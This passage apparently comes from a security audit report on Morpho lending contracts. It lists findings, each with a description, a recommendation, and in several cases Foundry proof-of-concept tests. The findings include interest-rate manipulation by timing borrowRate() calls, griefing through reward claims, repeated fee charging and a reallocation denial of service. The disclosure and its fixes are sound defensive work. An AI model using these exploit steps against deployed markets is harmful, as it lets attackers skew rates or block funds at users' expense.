`linearAdaptation` is determined by multiplying `speed` (a constant based on the market's utilization rate) with `elapsed`, which is the time passed since `borrowRate()` was last called:

```solidity
int256 speed = ADJUSTMENT_SPEED.wMulDown(err);
// market.lastUpdate != 0 because it is not the first interaction with this market.
// Safe "unchecked" cast because block.timestamp - market.lastUpdate <= block.timestamp <= type(int256).max.
int256 elapsed = int256(block.timestamp - market.lastUpdate);
int256 linearAdaptation = speed * elapsed;
```

As such, an attacker can control the value of `linearAdaptation` by strategically timing his calls to `borrowRate()`. 

This can be abused to influence `rateAtTarget` in the attacker's favor:
- The attacker wants to prevent a market's interest rate from increasing.
- He aims to call `borrowRate()` whenever `linearAdaptation` is `342465753424608000` as `wExp()` will have a -0.519% error.
- He calls `borrowRate()` every `342465753424608000 / speed` seconds:
  - Assume the market has the following configuration:
    - Curve Steepness: 4
    - Adjustment Speed: `50 ether / 365 days`
    - Target Utilization: 90%
    - Current Utilization: 95%
  - This results in `speed = 792744799594`.
  - Therefore, he calls every `432000` seconds, which happens to be every 5 days.
- As shown in the calculations above, if he calls `borrowRate()` every 5 days for 200 days (40 times), `rateAtTarget` will be 18.8% smaller than if `borrowRate()` was called once after 200 days. 

The scenario above demonstrates how the attacker can repeatedly call `borrowRate()` to reduce the growth rate of `rateAtTarget`. 

Note that such an attack can also be used to _increase_ the growth rate of `rateAtTarget` - `wExp()` would just need to have a positive error with the chosen value of `linearAdaptation` instead. In fact, the PoC below shows how a 0.902% error in the scenario above would have increased `rateAtTarget` by 41.6%.

The following PoC contains two tests:
- `testMinimizeRateAtTarget()` proves that reducing the growth rate of `rateAtTarget` is possible, as described above.
- `testMaximizeRateAtTarget()` demonstrates how `rateAtTarget` can be amplified using a positive error.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "src/AdaptiveCurveIrm.sol";
import "lib/forge-std/src/Test.sol";

contract wExpErrorTest is Test {
    using MarketParamsLib for MarketParams;

    int256 constant CURVE_STEEPNESS = 4 ether;
    int256 constant ADJUSTMENT_SPEED = int256(50 ether) / 365 days;
    int256 constant TARGET_UTILIZATION = 0.9 ether; // 90%
    int256 constant INITIAL_RATE_AT_TARGET = int256(1 ether) / 365 days;

    AdaptiveCurveIrm irm;
    MarketParams marketParams = MarketParams(address(0), address(0), address(0), address(0), 0);
    Market market;

    function setUp() public {
        irm = new AdaptiveCurveIrm(
            address(this), CURVE_STEEPNESS ,ADJUSTMENT_SPEED,TARGET_UTILIZATION, INITIAL_RATE_AT_TARGET
        );
        
        // Setup market with 95% utilization
        market.totalSupplyAssets = 1000;
        market.totalBorrowAssets = 950;
        irm.borrowRate(marketParams, market);
    }

    function testMinimizeRateAtTarget() public {
        // Call borrowRate() once after 200 days
        uint256 snapshot = vm.snapshot();
        int256 actualRate = _callBorrowRate(block.timestamp + 200 days);

        // Reset the state
        vm.revertTo(snapshot);

        // Call borrowRate() every 5 days
        int256 minimizedRate;
        for (uint i; i < 200 days / 5 days; i++) {
            minimizedRate = _callBorrowRate(block.timestamp + 5 days);
        }

        // minimizedRate is ~18.8% smaller than actualRate
        int256 delta = (actualRate - minimizedRate) * 1e18 / actualRate;
        assertGt(delta, 0.188 ether);
    }

    function testMaximizeRateAtTarget() public {
        // Call borrowRate() once after 200 days
        uint256 snapshot = vm.snapshot();
        int256 actualRate = _callBorrowRate(block.timestamp + 200 days);

        // Reset the state
        vm.revertTo(snapshot);
        uint256 startTime = block.timestamp;

        // Call borrowRate() every 5.06 days
        for (uint i; i < 39; i++) {
            _callBorrowRate(block.timestamp + 5.06 days);
        }

        // Call borrowRate() one last time at T + 200 days
        int256 maximizedRate = _callBorrowRate(startTime + 200 days);

        // maximizedRate is ~41.6% larger than actualRate
        int256 delta = (maximizedRate - actualRate) * 1e18 / actualRate;
        assertGt(delta, 0.416 ether);
    }

    function _callBorrowRate(uint256 timestamp) internal returns (int256) {
        market.lastUpdate = uint128(block.timestamp);
        vm.warp(timestamp);
        irm.borrowRate(marketParams, market);
        return irm.rateAtTarget(marketParams.id());
    }
}
```

**Recommendation:**

Consider using a more precise implementation of `wExp()` that has a smaller margin of error. Alternatively, modify `SignedWadMath.wadExp()` to suit `AdaptiveCurveIrm.sol`, which would be a lot more precise at the expense of readability.



### Add a rescue function for tokens in `UniversalRewardsDistributor`

**Severity:** Low risk

**Context:** [UniversalRewardsDistributor.sol#L18-L18](universal-rewards-distributor/src/UniversalRewardsDistributor.sol#L18-L18)

**Description**: The `UniversalRewardsDistributor` doesnt have a straightforward method for the `owner` to rescue tokens. This limitation poses several risks and inefficiencies. Tokens may remain unclaimed indefinitely, or excess tokens may be sent to the contract by mistake. Additionally, the contract might inadvertently receive different tokens through direct transfers or airdrops. While the current mechanism to withdraw these tokens involves creating a new Merkle root, this process is not only cumbersome but also prone to errors and potential security vulnerabilities. A more direct and controlled approach is needed to handle such scenarios effectively.

**Recommendation**: Add a dedicated rescueTokens function with an `onlyOwner` modifier. This function should allow the owner to withdraw a specific amount of a particular token from the contract.



### Malicious owner can set any address as `skimRecipient`

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

**Description**:
The owner has too much power when it comes to setting the `skimRecipient` of a Metamorpho vault because it can set any arbitraty address as skimmer without any restriction. It could even benefit from it , setting any owned wallet as `skimRecipient`.

**Recommendation**:
Involve another extra role in this function as a counterparty to the centralization risk.



### Arbitrary rewards sharing in Metamorpho vaults.

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

**Description**:
After the vault rewards are skimmed to a _URD_, the URD owner can share those rewards as he wishes without any restriction, setting the merkle tree config off-chain, potentially sharing them in a unfair way.

**Recommendation**:
Create a reward distributor implementation that distributes rewards pro-rata to the vault shares of the users(no merkle tree here), so some vaults can use it and be more trustless. 



### Aattacker can claim user onbehalf to inflate the claimed balance if token address not deployed and merkle tree root not set

**Severity:** Low risk

**Context:** [UniversalRewardsDistributor.sol#L120-L135](universal-rewards-distributor/src/UniversalRewardsDistributor.sol#L120-L135)

- Description

First, in UniversalRewardsDistributor.sol

the [function claim](https://github.com/morpho-org/universal-rewards-distributor/blob/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L115) is implemented below

```solidity
    function claim(address account, address reward, uint256 claimable, bytes32[] calldata proof)
        external
        returns (uint256 amount)
    {
        require(root != bytes32(0), ErrorsLib.ROOT_NOT_SET);
        require(
            MerkleProof.verifyCalldata(
                proof, root, keccak256(bytes.concat(keccak256(abi.encode(account, reward, claimable))))
            ),
            ErrorsLib.INVALID_PROOF_OR_EXPIRED
        );

        require(claimable > claimed[account][reward], ErrorsLib.CLAIMABLE_TOO_LOW);

        amount = claimable - claimed[account][reward];

        claimed[account][reward] = claimable;

        ERC20(reward).safeTransfer(account, amount);

        
```

second, the safeTransfer used is from solmate

```solidity
import {SafeTransferLib, ERC20} from "../lib/solmate/src/utils/SafeTransferLib.sol";
```

it is well known that solmate safe transfer call does not validate if the underlying token contract exists

if the token contract does not exist, then the safe transfer call sliently go through instead of revert

combining with the fact that claim function lack access control

1. owner deploy a UniversalRewardsDistributor.sol instances
2. owner prepare for a token distribution, and set the merkle root
3. the token is not deployed yet, the owner does not transfer any token to the airdrop contract yet
4. once the merkle tree root is set, malicious actor triggers claim onbehalf of user to claim the reward
5. because the safe transfer call sliently go through instead of revert, claim transaction go through

no token is distributed, but the account's claimed[account][reward] is incorrectly inflated

the expect behavior is

> if no token is in the distributor contract and the token is not deployed, claim transaction expects to revert

but the issue above make sure that

> if no token is in the distributor contract and the token is not deployed, claim transaction go through and inflate the  claimed[account][reward], block the regular user claim transaction

it would require updator role of the contract to update merkle root, but protocol has to wait for the timelock period pass to update the merkle root

so "griefing" is the impact

- Recommendation

add access control to the function claim

```solidity
require(msg.sender == account, 'invalid claim caller')
```

and make sure validating the token address is deployed and exists



### Unsafe use of `transfer()`/`transferFrom()` with `IERC20`

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

Some tokens do not implement the ERC20 standard properly but are still accepted by most code that accepts ERC20 tokens. For example Tether (USDT)'s `transfer()` and `transferFrom()`  functions on L1 do not return booleans as the specification requires, and instead have no return value. When these sorts of tokens are cast to `IERC20`, their function signatures do not match and therefore the calls made, revert (see this link for a test case). Use OpenZeppelin’s `SafeERC20`'s `safeTransfer()`/`safeTransferFrom()` instead.

*Instances (4)*:

```solidity
File: morpho-blue/src/libraries/SafeTransferLib.sol

23:             address(token).call(abi.encodeCall(IERC20Internal.transfer, (to, value)));

23:             address(token).call(abi.encodeCall(IERC20Internal.transfer, (to, value)));

31:             address(token).call(abi.encodeCall(IERC20Internal.transferFrom, (from, to, value)));

31:             address(token).call(abi.encodeCall(IERC20Internal.transferFrom, (from, to, value)));

```

[23](https://github.com/morpho-org/morpho-blue/tree/f463e40f776acd0f26d0d380b51cfd02949c8c23/src/libraries/SafeTransferLib.sol#L23), [23](https://github.com/morpho-org/morpho-blue/tree/f463e40f776acd0f26d0d380b51cfd02949c8c23/src/libraries/SafeTransferLib.sol#L23), [31](https://github.com/morpho-org/morpho-blue/tree/f463e40f776acd0f26d0d380b51cfd02949c8c23/src/libraries/SafeTransferLib.sol#L31), [31](https://github.com/morpho-org/morpho-blue/tree/f463e40f776acd0f26d0d380b51cfd02949c8c23/src/libraries/SafeTransferLib.sol#L31)



### Multiple charge of protocol fee even though the vault is not profitable

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

**Description**:

From the description, MetaMorpho users, who provide liquidity through the vault, are subject to a performance fee.

        - Users of MetaMorpho are liquidity providers that want to earn from borrowing interest without having to actively manage the risk of their position.
        - The active management of the deposited assets is the responsibility of a set of different roles (owner, curator and allocators).
        - The vault owner can set a performance fee, cutting up to 50% of the generated interest.

The current logic for performance fee calculation is based on the change in total assets (`newTotalAssets` - `lastTotalAssets`), with the fee applied as a percentage of this difference. This calculation occurs within the `_accruedFeeShares` function:

        function _accruedFeeShares() internal view returns (uint256 feeShares, uint256 newTotalAssets) {
                newTotalAssets = totalAssets();

                uint256 totalInterest = newTotalAssets.zeroFloorSub(lastTotalAssets);
                if (totalInterest != 0 && fee != 0) {
                uint256 feeAssets = totalInterest.mulDiv(fee, WAD);
                // The fee assets is subtracted from the total assets in this calculation to compensate for the fact
                // that total assets is already increased by the total interest (including the fee assets).
                feeShares =
                        _convertToSharesWithTotals(feeAssets, totalSupply(), newTotalAssets - feeAssets, Math.Rounding.Floor);
                }
        }

https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/metamorpho/src/MetaMorpho.sol#L914-L925

The issue arises in scenarios where the vault experiences a loss. Despite not generating overall profit, users can still be charged multiple times for the fee due to the `zeroFloorSub` function, which prevents `totalInterest` from being negative. Consequently, any increase in total assets, even if it doesn't surpass the previous high, results in additional fee charges.

This mechanism can lead to unfair fee deductions, as demonstrated in the given scenario. Here, after an initial fee charge on an asset increase, a borrower's liquidation reduces the total assets significantly. When the total assets recover slightly due to interest, another fee is charged, despite the overall value being lower than the original high.

In the scenario below, when the total assets increase to 1e18, 3.17e17 fee shares are minted. After that, the borrower is liquidated. It decreases the total assets to 6.7e17 (which loss 30%). After that the total assets increase a bit due to interest, the fee is charged again when 2.366e17 fee shares are minted.

POC:

The test demonstrates how the current fee calculation logic can lead to unfair and repeated fee charges, even when the vault has not achieved net profitability.

Create a file `MultipleFeeShareCharge.t.sol` in  `metamorpho/test/forge/MultipleFeeShareCharge.t.sol` folder.
Run: `cd metamorpho && forge test -vvvvv --match-path test/forge/MultipleFeeShareCharge.t.sol --match-test testMultipleFeeCharge`

```javascript
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import "../../lib/forge-std/src/Test.sol";
import "../../lib/forge-std/src/console2.sol";
import {Id, MarketParams, Market, IMorpho} from "../../lib/morpho-blue/src/interfaces/IMorpho.sol";
import "../../src/interfaces/IMetaMorpho.sol";
import {MetaMorpho, ERC20, IERC20, MarketAllocation} from "../../src/MetaMorpho.sol";
import {IrmMock} from "../../src/mocks/IrmMock.sol";
import {ERC20Mock} from "../../src/mocks/ERC20Mock.sol";
import {OracleMock} from "../../src/mocks/OracleMock.sol";

import {MarketParamsLib} from "../../lib/morpho-blue/src/libraries/MarketParamsLib.sol";

contract POC is Test {
    using MarketParamsLib for MarketParams;

    event AccrueInterest(uint256 newTotalAssets, uint256 feeShares);

    uint256 constant TIMELOCK = 1 weeks;
    uint256 constant ORACLE_PRICE_SCALE = 1e36;

    address internal OWNER = makeAddr("Owner");
    address internal MORPHO_OWNER = makeAddr("MorphoOwner");
    address internal SUPPLIER = makeAddr("Supplier");
    address internal ALLOCATOR = makeAddr("Allocator");
    address internal FEE_RECIPIENT = makeAddr("FeeRecipient");
    address internal BORROWER = makeAddr("Borrower");
    address internal LIQUIDATOR = makeAddr("Liquidator");

    MarketParams marketParams1;
    MarketParams marketParams2;
    MarketParams[] internal allMarkets;

    IMorpho internal morpho = IMorpho(deployCode("lib/morpho-blue/out/Morpho.sol/Morpho.json", abi.encode(MORPHO_OWNER)));
    ERC20Mock internal loanToken = new ERC20Mock("loan", "B");
    ERC20Mock internal collateralToken = new ERC20Mock("collateral", "C");
    OracleMock internal oracle = new OracleMock();
    IrmMock internal irm = new IrmMock();
    // vm.label(address(loanToken), "Loan");

    IMetaMorpho internal vault;

    function setUp() public {
        vault = IMetaMorpho(
            address(new MetaMorpho(OWNER, address(morpho), TIMELOCK, address(loanToken), "MetaMorpho Vault", "MMV"))
        );

        vm.startPrank(OWNER);
        vault.setIsAllocator(ALLOCATOR, true);
        vault.setFeeRecipient(FEE_RECIPIENT);
        vault.setFee(0.5e18);
        vm.stopPrank();

        marketParams1 = MarketParams({
            loanToken: address(loanToken),
            collateralToken: address(collateralToken),
            oracle: address(oracle),
            irm: address(irm),
            lltv: 0.8 ether
        });

        marketParams2 = MarketParams({
            loanToken: address(loanToken),
            collateralToken: address(collateralToken),
            oracle: address(oracle),
            irm: address(irm),
            lltv: 0.5 ether
        });

        allMarkets.push(marketParams1);
        allMarkets.push(marketParams2);

        vm.startPrank(MORPHO_OWNER);
        morpho.enableIrm(address(irm));

        morpho.enableLltv(0.8 ether);
        morpho.enableLltv(0.5 ether);
        vm.stopPrank();

        morpho.createMarket(marketParams1);
        morpho.createMarket(marketParams2);

        oracle.setPrice(ORACLE_PRICE_SCALE);
        irm.setApr(0.5 ether);
    }

    function testMultipleFeeCharge() public {
        // Setting up
        // Increase cap
        vm.startPrank(OWNER);
        vault.submitCap(marketParams1, 1e18);
        vm.warp(block.timestamp + 1 weeks);
        vault.acceptCap(allMarkets[0].id());
        vm.stopPrank();

        // Supply
        loanToken.setBalance(SUPPLIER, 10e18);
        vm.startPrank(SUPPLIER);
        loanToken.approve(address(vault), type(uint256).max);
        vault.deposit(1e18, SUPPLIER);
        vm.stopPrank();
        
        // Check new total asset at starting point
        vm.expectEmit();
        emit AccrueInterest(1000000000000000000, 0); // emit AccrueInterest(newTotalAssets: 1000000000000000000 [1e18], feeShares: 0)
        vault.deposit(0, SUPPLIER);
        console.log("Max withdraw amount before: ", vault.maxWithdraw(SUPPLIER));

        // Start create borrow
        collateralToken.setBalance(BORROWER, 1e18);
        vm.startPrank(BORROWER);
        collateralToken.approve(address(morpho), type(uint256).max);
        morpho.supplyCollateral(marketParams1, 1e18, BORROWER, hex"");
        morpho.borrow(marketParams1, 0.8e18, 0, BORROWER, BORROWER);
        vm.stopPrank();

        // Gain some interest and fee shares are charged
        _forward(50);
        vm.expectEmit();
        emit AccrueInterest(1000000634196091016, 317097944956861419); // emit AccrueInterest(newTotalAssets: 1000000634196091016 [1e18], feeShares: 317097944956861419 [3.17e17])
        vault.deposit(0, SUPPLIER);

        // Liquidate, expect new total assets to reduce from 1e18 to 6.7e17 due to loss from liquidation
        oracle.setPrice(ORACLE_PRICE_SCALE/2);
        loanToken.setBalance(LIQUIDATOR, 10e18);
        vm.startPrank(LIQUIDATOR);
        loanToken.approve(address(morpho), type(uint256).max);
        morpho.liquidate(marketParams1, BORROWER, 1e18, 0, hex"");
        
        vm.expectEmit();
        emit AccrueInterest(670000000000000001, 0); // AccrueInterest(newTotalAssets: 670000000000000001 [6.7e17], feeShares: 0)
        vault.deposit(0, SUPPLIER);
        vm.stopPrank();
        console.log("Max withdraw amount after: ", vault.maxWithdraw(SUPPLIER));

        // Borrow again to generate interest
        collateralToken.setBalance(BORROWER, 1e18);
        vm.startPrank(BORROWER);
        collateralToken.approve(address(morpho), type(uint256).max);
        morpho.supplyCollateral(marketParams1, 1e18, BORROWER, hex"");
        morpho.borrow(marketParams1, 0.2e18, 0, BORROWER, BORROWER);
        vm.stopPrank();

        _forward(100);

        // Accrue new interst and fee share is charged
        vm.expectEmit();
        emit AccrueInterest(670000317098171198, 236640445305168654); // AccrueInterest(newTotalAssets: 670000317098171198 [6.7e17], feeShares: 236640370266993549 [2.366e17])
        vault.deposit(0, SUPPLIER);
    }

    /// @dev Rolls & warps the given number of blocks forward the blockchain.
    function _forward(uint256 blocks) internal {
        uint256 BLOCK_TIME = 1;
        vm.roll(block.number + blocks);
        vm.warp(block.timestamp + blocks * BLOCK_TIME); // Block speed should depend on test network.
    }
}
```

**Recommendation**:

The protocol should implement a high watermark mechanism for each share. Fees should only be charged if the share value increases above its previous high mark. This approach ensures that fees are only levied on genuine profits, preventing unfair charges in scenarios where the vault has not been consistently profitable.




### Loss of protocol fee due to forced market removal	_(duplicate of [Metamorpho receives less fees when removes market with non-zero supply])_

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

**Description**:

The protocol's logic for calculating the performance fee is based on the difference between `newTotalAssets` and `lastTotalAssets`, multiplied by the `fee` percentage. The fee calculation is done in the `_accruedFeeShares` function, as shown in the following code excerpt:

                function _accruedFeeShares() internal view returns (uint256 feeShares, uint256 newTotalAssets) {
                        newTotalAssets = totalAssets();

                        uint256 totalInterest = newTotalAssets.zeroFloorSub(lastTotalAssets);
                        if (totalInterest != 0 && fee != 0) {
                        uint256 feeAssets = totalInterest.mulDiv(fee, WAD);
                        // The fee assets is subtracted from the total assets in this calculation to compensate for the fact
                        // that total assets is already increased by the total interest (including the fee assets).
                        feeShares =
                                _convertToSharesWithTotals(feeAssets, totalSupply(), newTotalAssets - feeAssets, Math.Rounding.Floor);
                        }
                }

https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/metamorpho/src/MetaMorpho.sol#L914-L925

On the other hand, the curators can submits a forced market removal from the vault by calling `submitMarketRemoval` even if there are funds in the market.

                /// @notice Submits a forced market removal from the vault, eventually losing all funds supplied to the market.
                /// @dev Warning: Submitting a forced removal will overwrite the timestamp at which the market will be removable.
                function submitMarketRemoval(Id id) external onlyCuratorRole {
                        if (config[id].removableAt != 0) revert ErrorsLib.AlreadySet();
                        if (!config[id].enabled) revert ErrorsLib.MarketNotEnabled();

                        _setCap(id, 0);

                        // Safe "unchecked" cast because timelock <= MAX_TIMELOCK.
                        config[id].removableAt = uint64(block.timestamp + timelock);

                        emit EventsLib.SubmitMarketRemoval(_msgSender(), id);
                }

https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/metamorpho/src/MetaMorpho.sol#L286-L304

So when the timelock passes, the allocators can call `updateWithdrawQueue` to remove the market from the vault.

                if (MORPHO.supplyShares(id, address(this)) != 0) {
                    if (config[id].removableAt == 0) revert ErrorsLib.InvalidMarketRemovalNonZeroSupply(id);

                    if (block.timestamp < config[id].removableAt) {
                        revert ErrorsLib.InvalidMarketRemovalTimelockNotElapsed(id);
                    }
                }

https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/metamorpho/src/MetaMorpho.sol#L370-L376

However, an issue arises with the forced removal of a market by curators. The `submitMarketRemoval` function enables curators to remove a market from the vault, potentially with funds still in the market. This is critical as the removal does not update `lastTotalAssets`, resulting in an incorrect total asset count after removal.

                uint256 totalInterest = newTotalAssets.zeroFloorSub(lastTotalAssets);

The problem manifests after the market is removed: `lastTotalAssets` remains unchanged, leading to a miscalculation of interest. If `newTotalAssets` becomes less than `lastTotalAssets` due to the removal, the calculated interest drops to zero. This, in turn, results in no fee being accrued for the protocol.

POC:

Create a file: `NotAccrueAfterRemoveMarket.POC.t.sol` and put in: `metamorpho/test/forge/NotAccrueAfterRemoveMarket.POC.t.sol`
Run: `cd metamorpho && forge test -vvvvv --match-path test/forge/NotAccrueAfterRemoveMarket.POC.t.sol --match-test testFeeNotAccrueAfterRemoveMarket`

Running this test shows that after a market is removed, the fee is not accounted for due to the unchanged lastTotalAssets.

```javascript
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import "../../lib/forge-std/src/Test.sol";
import "../../lib/forge-std/src/console2.sol";
import {Id, MarketParams, Market, IMorpho} from "../../lib/morpho-blue/src/interfaces/IMorpho.sol";
import "../../src/interfaces/IMetaMorpho.sol";
import {MetaMorpho, ERC20, IERC20, MarketAllocation} from "../../src/MetaMorpho.sol";
import {IrmMock} from "../../src/mocks/IrmMock.sol";
import {ERC20Mock} from "../../src/mocks/ERC20Mock.sol";
import {OracleMock} from "../../src/mocks/OracleMock.sol";

import {MarketParamsLib} from "../../lib/morpho-blue/src/libraries/MarketParamsLib.sol";

contract POC is Test {
    using MarketParamsLib for MarketParams;

    event AccrueInterest(uint256 newTotalAssets, uint256 feeShares);

    uint256 constant TIMELOCK = 1 weeks;

    address internal OWNER = makeAddr("Owner");
    address internal MORPHO_OWNER = makeAddr("MorphoOwner");
    address internal SUPPLIER = makeAddr("Supplier");
    address internal ALLOCATOR = makeAddr("Allocator");
    address internal FEE_RECIPIENT = makeAddr("FeeRecipient");
    address internal BORROWER = makeAddr("Borrower");

    MarketParams marketParams1;
    MarketParams marketParams2;
    MarketParams[] internal allMarkets;

    IMorpho internal morpho = IMorpho(deployCode("lib/morpho-blue/out/Morpho.sol/Morpho.json", abi.encode(MORPHO_OWNER)));
    ERC20Mock internal loanToken = new ERC20Mock("loan", "B");
    ERC20Mock internal collateralToken = new ERC20Mock("collateral", "C");
    OracleMock internal oracle = new OracleMock();
    IrmMock internal irm = new IrmMock();

    IMetaMorpho internal vault;

    function setUp() public {
        vault = IMetaMorpho(
            address(new MetaMorpho(OWNER, address(morpho), TIMELOCK, address(loanToken), "MetaMorpho Vault", "MMV"))
        );

        vm.startPrank(OWNER);
        vault.setIsAllocator(ALLOCATOR, true);
        vault.setFeeRecipient(FEE_RECIPIENT);
        vault.setFee(0.5e18);
        vm.stopPrank();

        marketParams1 = MarketParams({
            loanToken: address(loanToken),
            collateralToken: address(collateralToken),
            oracle: address(oracle),
            irm: address(irm),
            lltv: 0.8 ether
        });

        marketParams2 = MarketParams({
            loanToken: address(loanToken),
            collateralToken: address(collateralToken),
            oracle: address(oracle),
            irm: address(irm),
            lltv: 0.5 ether
        });

        allMarkets.push(marketParams1);
        allMarkets.push(marketParams2);

        vm.startPrank(MORPHO_OWNER);
        morpho.enableIrm(address(irm));

        morpho.enableLltv(0.8 ether);
        morpho.enableLltv(0.5 ether);
        vm.stopPrank();

        morpho.createMarket(marketParams1);
        morpho.createMarket(marketParams2);

        oracle.setPrice(1e36);
        irm.setApr(0.5 ether);
    }

    function testFeeNotAccrueAfterRemoveMarket() public {
        // Increase cap
        vm.startPrank(OWNER);
        vault.submitCap(marketParams1, 0.5e18);
        vault.submitCap(marketParams2, 1.5e18);
        vm.warp(block.timestamp + 1 weeks);
        vault.acceptCap(allMarkets[0].id());
        vault.acceptCap(allMarkets[1].id());
        vm.stopPrank();

        // Supplier deposit
        loanToken.setBalance(SUPPLIER, 1e18);
        vm.startPrank(SUPPLIER);
        loanToken.approve(address(vault), type(uint256).max);
        vault.deposit(1e18, SUPPLIER);
        vm.stopPrank();
        console.log("Number of shares supplier has: ", vault.balanceOf(SUPPLIER)); // 1000000e18

        // Interest generated by someone borrowing from market and time passes
        vm.startPrank(BORROWER);
        collateralToken.setBalance(BORROWER, 10e18);
        collateralToken.approve(address(morpho), type(uint256).max);
        morpho.supplyCollateral(marketParams1, 10e18, BORROWER, hex"");
        morpho.borrow(marketParams1, 0.2e18, 0, BORROWER, BORROWER);
        vm.warp(block.timestamp + 1 days);
        vault.deposit(0, SUPPLIER);
        vm.stopPrank();
        
        // Remove one market from vault
        vm.prank(OWNER);
        vault.submitMarketRemoval(marketParams1.id());
        vm.warp(block.timestamp + 1 weeks);

        vm.prank(ALLOCATOR);
        uint256[] memory indexes = new uint256[](1);
        indexes[0] = 1;
        vault.updateWithdrawQueue(indexes);


        // Time past 7 days but no fee for the protocol
        vm.warp(block.timestamp + 7 days);

        // Deposit 0 to accrue
        vm.expectEmit();
        emit AccrueInterest(500000000000000000, 0); // Fee shares is 0
        vault.deposit(0, SUPPLIER); 
        // newTotalAssets:  500000000000000000 = 0.5e18
        // lastTotalAssets:  1000274160340878146 = 1.0002e18 => More than newTotalAssets, so no interest
    }
}

```

**Recommendation**:

To resolve this issue, it is crucial to update `lastTotalAssets` after a market is removed from the vault. 

```diff
        for (uint256 i; i < currLength; ++i) {
            if (!seen[i]) {
                Id id = withdrawQueue[i];

                if (config[id].cap != 0) revert ErrorsLib.InvalidMarketRemovalNonZeroCap(id);

                if (MORPHO.supplyShares(id, address(this)) != 0) {
                    if (config[id].removableAt == 0) revert ErrorsLib.InvalidMarketRemovalNonZeroSupply(id);

                    if (block.timestamp < config[id].removableAt) {
                        revert ErrorsLib.InvalidMarketRemovalTimelockNotElapsed(id);
                    }
                }

                delete config[id];
            }
        }

        withdrawQueue = newWithdrawQueue;
+       uint256 newTotalAssets = _accrueFee();
+       _updateLastTotalAssets(newTotalAssets);

```



### Incomplete implementation of recovery function in ERC20PermissionedBase contract

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

**Description**:

The `ERC20PermissionedBase` contract is designed to allow users to deposit "underlying tokens" and, in return, receive an equivalent amount of "wrapped tokens". This contract extends the `ERC20Wrapper` contract from OpenZeppelin.

The issue arises if users inadvertently send underlying tokens directly to the `ERC20PermissionedBase` contract, these tokens become irretrievable. This is because, although the `ERC20Wrapper` contract from OpenZeppelin contains an internal function `_recover` to mint wrapped tokens corresponding to any accidentally transferred underlying tokens, this function is not utilized in the `ERC20PermissionedBase` contract.

The relevant code in the `ERC20Wrapper` contract is as follows:

```javascript
File: erc20-permissioned/lib/openzeppelin-contracts/contracts/token/ERC20/extensions/ERC20Wrapper.sol
81:     function _recover(address account) internal virtual returns (uint256) {
82:         uint256 value = _underlying.balanceOf(address(this)) - totalSupply();
83:         _mint(account, value);
84:         return value;
85:     }
```

**Recommendation**:

To address this issue, we recommend implementing a `recover` function in the `ERC20PermissionedBase` contract. 

                function recover(address receiver) public onlyOwner {
                        _recover(receiver);
                }



### DOS Risk in reallocate Function

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

**Description**:

The `reallocate` function in the system is designed to enable an allocator to shift a vault's liquidity between different markets. A critical operation within this function is disabling a market, achieved by setting allocation.assets to 0. This action triggers the withdrawal of all the vault's shares from the market.

        if (allocation.assets == 0) {
            shares = supplyShares;
            withdrawn = 0;
        }

        (uint256 withdrawnAssets, uint256 withdrawnShares) =
            MORPHO.withdraw(allocation.marketParams, withdrawn, shares, address(this), address(this));

However, the operation is subjected to DOS because if the withdrawn amount can be larger than the liquidity available on Morpho, there is no sufficient liquidity and the function will revert. If the allocated amount of the vault to the market is large, a borrower can borrow a small portion of liquidity and block the vault from withdrawing all of its shares.

However, this approach is vulnerable to a Denial of Service (DOS) attack. Specifically, if the withdrawn amount exceeds the available liquidity in Morpho due to outstanding borrowing, the function will revert due to insufficient liquidity. This vulnerability becomes more pronounced if the vault has a substantial allocation in the market and a borrower takes out even a minimal loan, effectively blocking the vault from withdrawing all its shares.

POC:

```javascript
    function testReallocateDOS() public { // Report @1
        // Increase cap
        vm.startPrank(OWNER);
        vault.submitCap(marketParams1, 0.5e18);
        vault.submitCap(marketParams2, 1.5e18);
        vm.warp(block.timestamp + 1 weeks);
        vault.acceptCap(allMarkets[0].id());
        vault.acceptCap(allMarkets[1].id());
        vm.stopPrank();

        // Supplier deposit
        loanToken.setBalance(SUPPLIER, 10e18);
        vm.startPrank(SUPPLIER);
        loanToken.approve(address(vault), type(uint256).max);
        vault.deposit(1e18, SUPPLIER);

        vm.stopPrank();

        // Borrow 1 wei
        vm.startPrank(BORROWER);
        collateralToken.setBalance(BORROWER, 10e18);
        collateralToken.approve(address(morpho), type(uint256).max);
        morpho.supplyCollateral(marketParams1, 10e18, BORROWER, hex"");
        morpho.borrow(marketParams1, 1, 0, BORROWER, BORROWER);
        vm.warp(block.timestamp + 1 days);
        vault.deposit(0, SUPPLIER);
        vm.stopPrank();

        // Reallocate
        MarketAllocation[] memory allocations = new MarketAllocation[](2);
        allocations[0] = (MarketAllocation(allMarkets[0], 0));
        allocations[1] = (MarketAllocation(allMarkets[1], type(uint256).max));

        vm.prank(ALLOCATOR);
        vault.reallocate(allocations); //  Reason: revert: insufficient liquidity
    }
```

**Recommendation**:

When `allocation.assets` is set to 0, the function should be designed to withdraw the maximum amount available in the market, instead of attempting to withdraw all shares.



### Missing checks for `address(0)` in constructor	_(duplicate of [Constructor lacks address(0) checks for immutable state variables])_

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

*Instances (3)*:

```solidity
File: erc20-permissioned/src/ERC20PermissionedBase.sol

43:         MORPHO = morpho;

44:         BUNDLER = bundler;

```

